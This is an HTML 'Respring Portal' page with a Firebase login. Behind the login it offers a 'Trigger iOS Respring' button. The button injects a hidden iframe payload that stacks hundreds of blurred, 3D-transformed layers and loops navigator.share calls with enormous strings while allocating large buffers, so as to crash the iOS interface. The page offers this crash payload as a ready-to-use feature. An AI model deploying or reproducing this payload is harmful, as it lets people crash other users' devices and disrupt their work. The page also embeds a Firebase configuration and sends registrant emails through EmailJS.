<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Respring Portal</title>
    <link rel="icon" href="https://yt3.ggpht.com/UiGTFSl6HLYxGQwsIubau4zxrOlIjlNdLDFJJ_3XTY-Tje0NUBTXGcMb8W2P5Vb2OzOMytFK5Q=s108-c-k-c0x00ffffff-no-rj">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-auth-compat.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body {
            margin: 0; 
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            flex-direction: column;
            background: linear-gradient(-45deg, #ff9a9e, #fecfef, #a1c4fd, #c2e9fb);
            background-size: 400% 400%; 
            animation: gradientBG 15s ease infinite;
        }
        
        @keyframes gradientBG { 
            0% {background-position: 0% 50%;} 
            50% {background-position: 100% 50%;} 
            100% {background-position: 0% 50%;} 
        }
        
        .header { 
            position: absolute; 
            top: 25px; 
            left: 25px; 
        }
        
        .header a { 
            text-decoration: none; 
            color: white; 
            font-weight: bold; 
            background: rgba(0,0,0,0.2); 
            padding: 10px 15px; 
            border-radius: 20px; 
            backdrop-filter: blur(5px); 
            transition: 0.3s;
        }
        
        .header a:hover { 
            background: rgba(0,0,0,0.4); 
        }
        
        .card {
            background: rgba(255, 255, 255, 0.85); 
            backdrop-filter: blur(15px); 
            -webkit-backdrop-filter: blur(15px);
            padding: 40px; 
            border-radius: 24px; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.1), inset 0 0 0 1px rgba(255,255,255,0.5);
            width: 100%; 
            max-width: 340px; 
            text-align: center; 
            position: relative; 
            overflow: hidden;
        }
        
        .card::before {
            content: ''; 
            position: absolute; 
            top: -50%; 
            left: -50%; 
            width: 200%; 
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.8) 0%, transparent 60%);
            animation: rotateGlow 10s linear infinite; 
            pointer-events: none; 
            z-index: 0;
        }
        
        @keyframes rotateGlow { 
            100% { transform: rotate(360deg); } 
        }
        
        .card-content { 
            position: relative; 
            z-index: 1; 
        }
        
        h2 { 
            margin-top: 0; 
            color: #1c1c1e; 
            font-size: 1.8rem; 
            letter-spacing: -0.5px; 
        }
        
        .input-group { 
            position: relative; 
            margin: 15px 0; 
        }
        
        .input-group i { 
            position: absolute; 
            left: 15px; 
            top: 15px; 
            color: #8e8e93; 
        }
        
        input {
            width: 100%; 
            padding: 14px 14px 14px 45px; 
            border: 1px solid rgba(0,0,0,0.1);
            border-radius: 12px; 
            box-sizing: border-box; 
            outline: none; 
            background: rgba(255,255,255,0.9);
            font-size: 1rem; 
            transition: 0.3s;
        }
        
        input:focus { 
            border-color: #007aff; 
            box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.2); 
        }
        
        .btn-group { 
            display: flex; 
            flex-direction: column; 
            gap: 10px; 
            margin-top: 20px; 
        }
        
        button {
            width: 100%; 
            padding: 14px; 
            border: none; 
            border-radius: 12px; 
            font-size: 1rem;
            color: white; 
            font-weight: bold; 
            cursor: pointer; 
            transition: 0.3s; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            gap: 8px;
        }
        
        .btn-login { 
            background: #007aff; 
            box-shadow: 0 4px 15px rgba(0, 122, 255, 0.3); 
        }
        
        .btn-register { 
            background: #34c759; 
            box-shadow: 0 4px 15px rgba(52, 199, 89, 0.3); 
        }
        
        .btn-respring { 
            background: #ff3b30; 
            box-shadow: 0 4px 15px rgba(255, 59, 48, 0.3); 
        }
        
        .btn-logout { 
            background: #8e8e93; 
        }
        
        button:hover { 
            transform: translateY(-2px); 
            filter: brightness(1.1); 
        }
        
        .forgot-pass { 
            display: block; 
            margin-top: 15px; 
            font-size: 0.9rem; 
            color: #007aff; 
            text-decoration: none; 
            cursor: pointer; 
            font-weight: 500; 
        }
        
        .forgot-pass:hover { 
            text-decoration: underline; 
        }
        
        .hidden { 
            display: none !important; 
        }
        
        #message { 
            margin-top: 15px; 
            font-size: 0.9rem; 
            font-weight: 500; 
            border-radius: 8px; 
            padding: 10px; 
            display: none; 
        }
        
        .msg-error { 
            background: rgba(255, 59, 48, 0.1); 
            color: #ff3b30; 
            display: block !important; 
        }
        
        .msg-success { 
            background: rgba(52, 199, 89, 0.1); 
            color: #34c759; 
            display: block !important; 
        }
    </style>
</head>
<body>

    <div class="header">
        <a href="index.html">
            <i class="fa-solid fa-arrow-left"></i> Home
        </a>
    </div>

    <div class="card" id="auth-section">
        <div class="card-content">
            <h2><i class="fa-solid fa-shield-halved" style="color: #007aff;"></i> Secure Portal</h2>
            <form id="loginForm" onsubmit="event.preventDefault(); handleAuth('login');">
                <div class="input-group">
                    <i class="fa-solid fa-envelope"></i>
                    <input type="email" id="email" autocomplete="username" placeholder="Email Address" required>
                </div>
                <div class="input-group">
                    <i class="fa-solid fa-lock"></i>
                    <input type="password" id="password" autocomplete="current-password" placeholder="Password" required>
                </div>
                <div class="btn-group">
                    <button type="submit" class="btn-login">
                        <i class="fa-solid fa-right-to-bracket"></i> Login
                    </button>
                    <button type="button" class="btn-register" onclick="handleAuth('register')">
                        <i class="fa-solid fa-user-plus"></i> Create Account
                    </button>
                </div>
            </form>
            <a class="forgot-pass" onclick="resetPassword()">Forgot Password?</a>
            <div id="message"></div>
        </div>
    </div>

    <div class="card hidden" id="app-section">
        <div class="card-content">
            <h2><i class="fa-solid fa-bolt" style="color: #ffcc00;"></i> Dashboard</h2>
            <p style="color: #666; font-size: 0.95rem; margin-bottom: 25px;">Session active. Your device is verified.</p>
            <div class="btn-group">
                <button onclick="triggerRespring()" class="btn-respring">
                    <i class="fa-solid fa-rotate"></i> Trigger iOS Respring
                </button>
                <button onclick="logout()" class="btn-logout">
                    <i class="fa-solid fa-right-from-bracket"></i> Logout
                </button>
            </div>
        </div>
    </div>

    <iframe id="frame" style="width: 1px;height: 1px; border: none;" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBkjcjiwBh1dmEUektJhCHE2nRwjhtCeP4",
            authDomain: "ianyfeature.firebaseapp.com",
            projectId: "ianyfeature",
            storageBucket: "ianyfeature.firebasestorage.app",
            messagingSenderId: "1007093442879",
            appId: "1:1007093442879:web:2a3808db49b2f13f008b8a",
            measurementId: "G-W8CLLBGVMZ"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        auth.setPersistence(firebase.auth.Auth.Persistence.LOCAL);

        // DO NOT FORGET to put your EmailJS Public Key and Template ID here
        emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
        const emailjsServiceID = "service_jn8hk3h";
        const emailjsTemplateID = "YOUR_EMAILJS_TEMPLATE_ID";

        const showMsg = (msg, type) => {
            const el = document.getElementById('message');
            el.innerText = msg; 
            el.className = type === 'error' ? 'msg-error' : 'msg-success';
        };

        const toggleUI = (isLoggedIn) => {
            document.getElementById('auth-section').classList.toggle('hidden', isLoggedIn);
            document.getElementById('app-section').classList.toggle('hidden', !isLoggedIn);
        };

        auth.onAuthStateChanged(user => {
            if (user && user.emailVerified) {
                toggleUI(true);
            } else {
                toggleUI(false);
            }
        });

        async function handleAuth(action) {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            if (!email || !password) return showMsg("Please enter email and password.", "error");

            try {
                if (action === 'register') {
                    const userCredential = await auth.createUserWithEmailAndPassword(email, password);
                    await userCredential.user.sendEmailVerification();
                    showMsg("Registration successful! Check your email to verify your account.", "success");
                    emailjs.send(emailjsServiceID, emailjsTemplateID, { user_email: email });
                } else {
                    const userCredential = await auth.signInWithEmailAndPassword(email, password);
                    if (!userCredential.user.emailVerified) {
                        showMsg("Please verify your email first. Check your inbox.", "error");
                        auth.signOut();
                    }
                }
            } catch (error) { 
                showMsg(error.message.replace('Firebase:', '').trim(), "error"); 
            }
        }

        async function resetPassword() {
            const email = document.getElementById('email').value;
            if (!email) return showMsg("Please enter your email address in the field above to reset your password.", "error");
            try {
                await auth.sendPasswordResetEmail(email);
                showMsg("Password reset email sent! Please check your inbox.", "success");
            } catch (error) { 
                showMsg(error.message.replace('Firebase:', '').trim(), "error"); 
            }
        }

        function logout() { 
            auth.signOut(); 
        }

        function triggerRespring() {
            const frame = document.getElementById('frame');
            const respringScript = `
                <html>
                <body>
                    <script>
                        const container = document.createElement('div');
                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                        document.body.appendChild(container);
                        
                        for (let i = 0; i < 500; i++) {
                            let d = document.createElement('div');
                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
                            container.appendChild(d);
                        }
                        
                        setInterval(() => {
                            navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
                            let x = new Uint8Array(1024 * 1024 * 10);
                            crypto.getRandomValues(x);
                        }, 0);
                    <\/script>
                </body>
                </html>
            `;
            frame.srcdoc = respringScript; //[span_0](start_span)[span_0](end_span)
        }
    </script>
</body>
</html>
